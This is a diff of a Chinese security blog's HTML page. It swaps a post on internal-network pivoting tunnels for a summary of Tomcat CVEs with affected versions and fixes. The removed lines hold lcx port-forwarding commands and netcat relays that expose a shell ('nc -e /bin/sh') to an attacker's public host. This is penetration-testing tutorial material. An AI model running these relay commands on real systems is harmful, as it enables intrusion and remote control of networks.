@@ -2,9 +2,9 @@
 <html>
 <head>
   <meta charset="utf-8">
-  <title>内网渗透--建立隐藏通信隧道 | Beret-81</title>
-  <meta name="keywords" content=" 信息收集、学习记录 ">
-  <meta name="description" content="内网渗透--建立隐藏通信隧道 | Beret-81">
+  <title>Tomcat 漏洞总结 | Beret-81</title>
+  <meta name="keywords" content=" Tomcat 漏洞 中间件 ">
+  <meta name="description" content="Tomcat 漏洞总结 | Beret-81">
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
 <meta name="description" content="渗透测试–文件下载0x01 简介 在我们渗透测试的过程中，通常会需要向目标主机传送一些文件，来达到提权，维持控制等目的。因此当不方便进行直接传输时，同时目标主机是能有网络连接的，那么此时就可以通过本地下载这种方法来达到文件传输的目的。此篇文章，我会对互联网上针对win与linux大部分的下载指令来做一个汇总，可能会有疏漏，但汇总的都是经常会用的。  0x02 Linux2.1 Wget 这款工具功">
 <meta property="og:type" content="article">
@@ -461,9 +461,9 @@
 </aside>
 <div id="post">
     <div class="pjax">
-        <article id="post-内网渗透-建立隐藏通信隧道" class="article article-type-post" itemscope itemprop="blogPost">
+        <article id="post-Tomcat-漏洞总结" class="article article-type-post" itemscope itemprop="blogPost">
     
-        <h1 class="article-title">内网渗透--建立隐藏通信隧道</h1>
+        <h1 class="article-title">Tomcat 漏洞总结</h1>
     
     <div class="article-meta">
         
@@ -473,7 +473,7 @@
             <i class="iconfont icon-category"></i>
             
             
-            <a  data-rel="内网渗透">内网渗透</a>
+            <a  data-rel="漏洞集合">漏洞集合</a>
             
         </span>
         
@@ -481,14 +481,14 @@
         <span class="tag">
             <i class="iconfont icon-tag"></i>
             
-            <a class="color5">信息收集、学习记录</a>
+            <a class="color4">Tomcat 漏洞 中间件</a>
             
         </span>
         
     </div>
     <div class="article-meta">
         
-            Created At : <time class="date" title='Updated At: 2020-08-11 18:03:36'>2020-02-03 10:36</time>
+            Created At : <time class="date" title='Updated At: 2020-08-14 16:39:21'>2020-08-14 16:03</time>
         
     </div>
     <div class="article-meta">
@@ -510,7 +510,7 @@
     
     <div class="toc-ref">
     
-        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#内网渗透-建立隐藏通信隧道"><span class="toc-text">内网渗透-建立隐藏通信隧道</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#网络层隧道技术"><span class="toc-text">网络层隧道技术</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#传输层隧道技术"><span class="toc-text">传输层隧道技术</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1、lcx-端口转发"><span class="toc-text">1、lcx 端口转发</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-1-内网端口转发"><span class="toc-text">1.1 内网端口转发</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#1-2-本地端口映射"><span class="toc-text">1.2 本地端口映射</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2、NC-代理转发"><span class="toc-text">2、NC 代理转发</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#应用层隧道技术"><span class="toc-text">应用层隧道技术</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1、ssh-代理转发"><span class="toc-text">1、ssh 代理转发</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-1本地转发"><span class="toc-text">1.1本地转发</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SOCKS-代理"><span class="toc-text">SOCKS 代理</span></a></li></ol></li></ol>
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Tomcat-漏洞总结"><span class="toc-text">Tomcat 漏洞总结</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#1、Apache-Tomcat样例目录session操纵漏洞"><span class="toc-text">1、Apache Tomcat样例目录session操纵漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#漏洞描述："><span class="toc-text">漏洞描述：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#影响范围"><span class="toc-text">影响范围</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#漏洞修复"><span class="toc-text">漏洞修复</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#漏洞复现"><span class="toc-text">漏洞复现</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2、Apache-Tomcat-管理后台弱口令-Getshell"><span class="toc-text">2、Apache Tomcat 管理后台弱口令 Getshell</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#漏洞描述"><span class="toc-text">漏洞描述</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#影响范围-1"><span class="toc-text">影响范围</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#漏洞修复-1"><span class="toc-text">漏洞修复</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#漏洞复现-1"><span class="toc-text">漏洞复现</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3、Apache-Tomcat反序列化漏洞-CVE-2016-8735"><span class="toc-text">3、Apache Tomcat反序列化漏洞(CVE-2016-8735)</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#漏洞描述-1"><span class="toc-text">漏洞描述</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#漏洞编号"><span class="toc-text">漏洞编号</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#影响范围-2"><span class="toc-text">影响范围</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#漏洞修复-2"><span class="toc-text">漏洞修复</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#漏洞复现-2"><span class="toc-text">漏洞复现</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4、Apache-Tomcat-远程代码执行漏洞（CVE-2017-12615）"><span class="toc-text">4、Apache Tomcat 远程代码执行漏洞（CVE-2017-12615）</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#漏洞描述-2"><span class="toc-text">漏洞描述</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#漏洞编号-1"><span class="toc-text">漏洞编号</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#影响范围-3"><span class="toc-text">影响范围</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#漏洞修复-3"><span class="toc-text">漏洞修复</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#漏洞复现-3"><span class="toc-text">漏洞复现</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#5、Apache-Tomcat-远程代码执行漏洞（CVE-2019-0232）"><span class="toc-text">5、Apache Tomcat 远程代码执行漏洞（CVE-2019-0232）</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#漏洞描述-3"><span class="toc-text">漏洞描述</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#漏洞编号-2"><span class="toc-text">漏洞编号</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#影响范围-4"><span class="toc-text">影响范围</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#漏洞复现-4"><span class="toc-text">漏洞复现</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#6、Apache-Tomcat-Ajp-文件包含漏洞-CVE-2020-1938"><span class="toc-text">6、Apache-Tomcat-Ajp 文件包含漏洞 (CVE-2020-1938)</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#漏洞描述-4"><span class="toc-text">漏洞描述</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#漏洞编号-3"><span class="toc-text">漏洞编号</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#影响范围-5"><span class="toc-text">影响范围</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#漏洞复现-5"><span class="toc-text">漏洞复现</span></a></li></ol></li></ol></li></ol>
     
 <style>
     .left-col .switch-btn,
@@ -526,34 +526,58 @@
     
     <div class="article-entry" itemprop="articleBody">
       
-        <h1 id="内网渗透-建立隐藏通信隧道"><a href="#内网渗透-建立隐藏通信隧道" class="headerlink" title="内网渗透-建立隐藏通信隧道"></a>内网渗透-建立隐藏通信隧道</h1><h2 id="网络层隧道技术"><a href="#网络层隧道技术" class="headerlink" title="网络层隧道技术"></a>网络层隧道技术</h2><h2 id="传输层隧道技术"><a href="#传输层隧道技术" class="headerlink" title="传输层隧道技术"></a>传输层隧道技术</h2><blockquote>
-<p>传输层技术包括TCP 隧道、UDP 隧道、和常见的端口转发等。在渗透测试中，如果内网防火墙阻止了对指定端口的访问，在获得目标机器的权限后，可以使用IPTABLES打开指定端口。</p>
+        <h1 id="Tomcat-漏洞总结"><a href="#Tomcat-漏洞总结" class="headerlink" title="Tomcat 漏洞总结"></a>Tomcat 漏洞总结</h1><h2 id="1、Apache-Tomcat样例目录session操纵漏洞"><a href="#1、Apache-Tomcat样例目录session操纵漏洞" class="headerlink" title="1、Apache Tomcat样例目录session操纵漏洞"></a>1、Apache Tomcat样例目录session操纵漏洞</h2><h3 id="漏洞描述："><a href="#漏洞描述：" class="headerlink" title="漏洞描述："></a>漏洞描述：</h3><blockquote>
+<p>Tomcat 在使用时一般直接下载源代码包，解压后直接使用。默认情况下，Tomcat 源码包 Web 根目录下包含 servlets-examples 和 tomcat-docs 目录，这些目录下的某些样例存在安全风险。<br>例如，session 样例（/examples/servlets/servlet/SessionExample）允许用户对 session 进行操纵，可被黑客利用来绕过网站验证机制直接登录后台。</p>
 </blockquote>
-<h3 id="1、lcx-端口转发"><a href="#1、lcx-端口转发" class="headerlink" title="1、lcx 端口转发"></a>1、lcx 端口转发</h3><blockquote>
-<p>LCX是一个基于socket 套接字实现的端口转发工具。windows版本为lcx.exe，Linux 版本为 portmap。</p>
+<h3 id="影响范围"><a href="#影响范围" class="headerlink" title="影响范围"></a>影响范围</h3><pre><code>所有版本的 Tomcat</code></pre><h3 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h3><pre><code>由于一般情况下，无需使用样例功能，建议您在部署完 Tomcat 后直接删除 servlets-examples 和 tomcat-docs 目录。</code></pre><h3 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><p> <a href="https://blog.51cto.com/chenjc/1434858" target="_blank" rel="noopener" title="Apache Tomcat样例目录session操纵漏洞复现">Apache Tomcat样例目录session操纵漏洞复现</a></p>
+<hr>
+<h2 id="2、Apache-Tomcat-管理后台弱口令-Getshell"><a href="#2、Apache-Tomcat-管理后台弱口令-Getshell" class="headerlink" title="2、Apache Tomcat 管理后台弱口令 Getshell"></a>2、Apache Tomcat 管理后台弱口令 Getshell</h2><h3 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h3><blockquote>
+<p>War包可以放在Tomcat下的webapps或word目录,当Tomcat服务器启动时，War包即会随之解压源代码来进行自动部署。</p>
 </blockquote>
-<h4 id="1-1-内网端口转发"><a href="#1-1-内网端口转发" class="headerlink" title="1.1 内网端口转发"></a>1.1 内网端口转发</h4><pre><code>在目标机器上执行如下命令，将目标机器3389端口的所有数据转发到公网vps的4444 端口上
-lcx.exe -slave 公网主机IP  4444 127.0.0.1 3389
-在vps 上执行如下命令，将本机4444端口上监听的所有数据转发到本机的5555 端口上。
-lcx.exe -listen 4444 5555
-此时，我们使用 mstsc 连接 &lt;公网IP地址&gt;：5555，即可访问目标服务器的3389端口。</code></pre><h4 id="1-2-本地端口映射"><a href="#1-2-本地端口映射" class="headerlink" title="1.2 本地端口映射"></a>1.2 本地端口映射</h4><pre><code>如果目标主机的部分端口（如3389）被防火墙拦截时，我们可以通过目标主机相应端口的数据传到防火墙允许的其他端口（如53）。
-在目标主机上执行如下命令，就可以直接从远程桌面连接到目标主机的53端口了。
-lcx.exe -tran &lt;目标主机IP地址&gt; 3389</code></pre><h3 id="2、NC-代理转发"><a href="#2、NC-代理转发" class="headerlink" title="2、NC 代理转发"></a>2、NC 代理转发</h3><pre><code>通过边界机作代理,使kali与数据库通信,访问内网数据库：
+<h3 id="影响范围-1"><a href="#影响范围-1" class="headerlink" title="影响范围"></a>影响范围</h3><pre><code>所有版本的 Tomcat</code></pre><h3 id="漏洞修复-1"><a href="#漏洞修复-1" class="headerlink" title="漏洞修复"></a>漏洞修复</h3><pre><code>1、改用户名和密码
+2、修改权限。
+&lt;user username=&quot;tomcat&quot; password=&quot;tomcat&quot; roles=&quot;manager-gui&quot;/&gt;
+去掉roles属性里的manager，然后重启tomcat。因为tomcat重启时会重新加载配置文件。</code></pre><h3 id="漏洞复现-1"><a href="#漏洞复现-1" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><p><a href="https://blog.csdn.net/weixin_42918771/article/details/104876025" target="_blank" rel="noopener" title="Apache Tomcat 管理后台弱口令 Getshell">Apache Tomcat 管理后台弱口令 Getshell</a></p>
+<hr>
+<h2 id="3、Apache-Tomcat反序列化漏洞-CVE-2016-8735"><a href="#3、Apache-Tomcat反序列化漏洞-CVE-2016-8735" class="headerlink" title="3、Apache Tomcat反序列化漏洞(CVE-2016-8735)"></a>3、Apache Tomcat反序列化漏洞(CVE-2016-8735)</h2><h3 id="漏洞描述-1"><a href="#漏洞描述-1" class="headerlink" title="漏洞描述"></a>漏洞描述</h3><blockquote>
+<p>该漏洞与之前Oracle发布的 mxRemoteLifecycleListener 反序列化漏洞（CVE-2016-3427）相关，是由于使用了JmxRemoteLifecycleListener 的监听功能所导致。而在Oracle官方发布修复后，Tomcat未能及时修复更新而导致的远程代码执行。<br>   该漏洞所造成的最根本原因是Tomcat在配置JMX做监控时使用了 JmxRemoteLifecycleListener 的方法。</p>
+</blockquote>
+<h3 id="漏洞编号"><a href="#漏洞编号" class="headerlink" title="漏洞编号"></a>漏洞编号</h3><pre><code>CVE-2016-8735</code></pre><h3 id="影响范围-2"><a href="#影响范围-2" class="headerlink" title="影响范围"></a>影响范围</h3><pre><code>ApacheTomcat 9.0.0.M1 到9.0.0.M11
+ApacheTomcat 8.5.0 到8.5.6
+ApacheTomcat 8.0.0.RC1 到8.0.38
+ApacheTomcat 7.0.0 到7.0.72
+ApacheTomcat 6.0.0 到6.0.47</code></pre><h3 id="漏洞修复-2"><a href="#漏洞修复-2" class="headerlink" title="漏洞修复"></a>漏洞修复</h3><pre><code>1、关闭 JmxRemoteLifecycleListener 功能，或者是对 jmx JmxRemoteLifecycleListener 远程端口进行网络访问控制。同时，增加严格的认证方式。
+2、根据官方去升级更新相对应的版本。</code></pre><h3 id="漏洞复现-2"><a href="#漏洞复现-2" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><p><a href="https://www.jianshu.com/p/1581b9b2849b" target="_blank" rel="noopener" title="Apache Tomcat反序列化漏洞(CVE-2016-8735)">Apache Tomcat反序列化漏洞(CVE-2016-8735)</a></p>
+<hr>
+<h2 id="4、Apache-Tomcat-远程代码执行漏洞（CVE-2017-12615）"><a href="#4、Apache-Tomcat-远程代码执行漏洞（CVE-2017-12615）" class="headerlink" title="4、Apache Tomcat 远程代码执行漏洞（CVE-2017-12615）"></a>4、Apache Tomcat 远程代码执行漏洞（CVE-2017-12615）</h2><h3 id="漏洞描述-2"><a href="#漏洞描述-2" class="headerlink" title="漏洞描述"></a>漏洞描述</h3><blockquote>
+<p>2017年9月19日，ApacheTomcat官方确认并修复了两个高危漏洞，漏洞CVE编号:CVE-2017-12615和CVE-2017-12616,其中远程代码执行漏洞（CVE-2017-12615）影响： Apache Tomcat 7.0.0 - 7.0.79（7.0.81修复不完全）当 Tomcat 运行在 Windows 主机上，且启用了 HTTP PUT 请求方法（例如，将 readonly 初始化参数由默认值设置为 false），攻击者将有可能可通过精心构造的攻击请求向服务器上传包含任意代码的 JSP 文件。之后，JSP 文件中的代码将能被服务器执行。</p>
+</blockquote>
+<h3 id="漏洞编号-1"><a href="#漏洞编号-1" class="headerlink" title="漏洞编号"></a>漏洞编号</h3><pre><code>CVE-2017-12615</code></pre><h3 id="影响范围-3"><a href="#影响范围-3" class="headerlink" title="影响范围"></a>影响范围</h3><pre><code>Apache Tomcat 7.0.0 – 7.0.81</code></pre><h3 id="漏洞修复-3"><a href="#漏洞修复-3" class="headerlink" title="漏洞修复"></a>漏洞修复</h3><pre><code>1、 PUT默认是关闭的。如果开启了，可将conf/web.xml 中对于 DefaultServlet 的 readonly 设置为 true，才能防止漏洞。
+2、升级到稳定版本。</code></pre><h3 id="漏洞复现-3"><a href="#漏洞复现-3" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><p><a href="https://blog.csdn.net/weixin_42918771/article/details/104842965" target="_blank" rel="noopener" title="Tomcat 远程代码执行漏洞利用姿势 (CVE-2017-12615)">Tomcat 远程代码执行漏洞利用姿势 (CVE-2017-12615)</a></p>
+<hr>
+<h2 id="5、Apache-Tomcat-远程代码执行漏洞（CVE-2019-0232）"><a href="#5、Apache-Tomcat-远程代码执行漏洞（CVE-2019-0232）" class="headerlink" title="5、Apache Tomcat 远程代码执行漏洞（CVE-2019-0232）"></a>5、Apache Tomcat 远程代码执行漏洞（CVE-2019-0232）</h2><h3 id="漏洞描述-3"><a href="#漏洞描述-3" class="headerlink" title="漏洞描述"></a>漏洞描述</h3><blockquote>
+<p>Apache Tomcat是美国阿帕奇（Apache）软件基金会的一款轻量级Web应用服务器。该程序实现了对Servlet和JavaServer Page（JSP）的支持。<br> 4月11日，Apache官方发布通告称将在最新版本中修复一个远程代码执行漏洞（CVE-2019-0232），由于JRE将命令行参数传递给Windows的方式存在错误，会导致CGI Servlet受到远程执行代码的攻击。<br> 触发该漏洞需要同时满足以下条件：</p>
+</blockquote>
+<blockquote>
+<p>1、系统为Windows<br>2、启用了CGI Servlet（默认为关闭）<br>3、启用了enableCmdLineArguments（Tomcat 9.0.*及官方未来发布版本默认为关闭）</p>
+</blockquote>
+<h3 id="漏洞编号-2"><a href="#漏洞编号-2" class="headerlink" title="漏洞编号"></a>漏洞编号</h3><pre><code>CVE-2019-0232</code></pre><h3 id="影响范围-4"><a href="#影响范围-4" class="headerlink" title="影响范围"></a>影响范围</h3><pre><code>Apache Tomcat 9.0.0.M1 to 9.0.17
+Apache Tomcat 8.5.0 to 8.5.39
+Apache Tomcat 7.0.0 to 7.0.93
+不受影响的版本：
+Apache Tomcat 9.0.18
+Apache Tomcat 8.5.40
+Apache Tomcat 7.0.94</code></pre><h3 id="漏洞复现-4"><a href="#漏洞复现-4" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><p><a href="https://blog.csdn.net/qq_41770175/article/details/93092281?depth_1-utm_source=distribute.pc_relevant.none-task&utm_source=distribute.pc_relevant.none-task" target="_blank" rel="noopener" title="Apache Tomcat 远程代码执行漏洞（CVE-2019-0232）">Apache Tomcat 远程代码执行漏洞（CVE-2019-0232）</a></p>
+<hr>
+<h2 id="6、Apache-Tomcat-Ajp-文件包含漏洞-CVE-2020-1938"><a href="#6、Apache-Tomcat-Ajp-文件包含漏洞-CVE-2020-1938" class="headerlink" title="6、Apache-Tomcat-Ajp 文件包含漏洞 (CVE-2020-1938)"></a>6、Apache-Tomcat-Ajp 文件包含漏洞 (CVE-2020-1938)</h2><h3 id="漏洞描述-4"><a href="#漏洞描述-4" class="headerlink" title="漏洞描述"></a>漏洞描述</h3><blockquote>
+<p>Tomcat是由Apache软件基金会属下Jakarta项目开发的Servlet容器，按照Sun Microsystems提供的技术规范，实现了对Servlet和JavaServer Page（JSP）的支持。由于Tomcat本身也内含了HTTP服务器，因此也可以视作单独的Web服务器。CVE-2020-1938是文件包含漏洞，攻击者可利用该漏洞读取或包含 Tomcat 上所有 webapp 目录下的任意文件，如：webapp 配置文件、源代码等。</p>
+</blockquote>
+<h3 id="漏洞编号-3"><a href="#漏洞编号-3" class="headerlink" title="漏洞编号"></a>漏洞编号</h3><pre><code>CVE-2020-1938、CNVD-2020-10487</code></pre><h3 id="影响范围-5"><a href="#影响范围-5" class="headerlink" title="影响范围"></a>影响范围</h3><pre><code>Apache Tomcat 9.x &lt; 9.0.31
+Apache Tomcat 8.x &lt; 8.5.51
+Apache Tomcat 7.x &lt; 7.0.100
+Apache Tomcat 6.x</code></pre><h3 id="漏洞复现-5"><a href="#漏洞复现-5" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><p><a href="https://blog.csdn.net/weixin_42918771/article/details/104998981" target="_blank" rel="noopener" title="Apache-Tomcat-Ajp(CVE-2020-1938)漏洞利用姿势">Apache-Tomcat-Ajp(CVE-2020-1938)漏洞复现</a></p>
+<hr>
 
-攻击机：192.136.100.111 (公网IP)
-WEB边界机：192.168.1.100 10.10.10.100
-内网数据库：10.10.10.200
-
-攻击机执行:
-nc -lvp 3333
-数据库执行:
-nc -lvp 3333 -e /bin/sh
-web服务器执行：
-nc -v 192.136.100.111 3333 -c &quot;nc -v 10.10.10.200 3333&quot;</code></pre><h2 id="应用层隧道技术"><a href="#应用层隧道技术" class="headerlink" title="应用层隧道技术"></a>应用层隧道技术</h2><h3 id="1、ssh-代理转发"><a href="#1、ssh-代理转发" class="headerlink" title="1、ssh 代理转发"></a>1、ssh 代理转发</h3><h4 id="1-1本地转发"><a href="#1-1本地转发" class="headerlink" title="1.1本地转发"></a>1.1本地转发</h4><pre><code>通过边界机作代理,使kali与数据库通信,访问内网数据库：
-
-攻击机：192.136.100.111 (公网IP)
-WEB边界机：192.168.1.100 10.10.10.100
-内网数据库：10.10.10.200</code></pre><h2 id="SOCKS-代理"><a href="#SOCKS-代理" class="headerlink" title="SOCKS 代理"></a>SOCKS 代理</h2>
       
        <hr><span style="font-style: italic;color: gray;"> 转载请注明来源。 </span>
     </div>
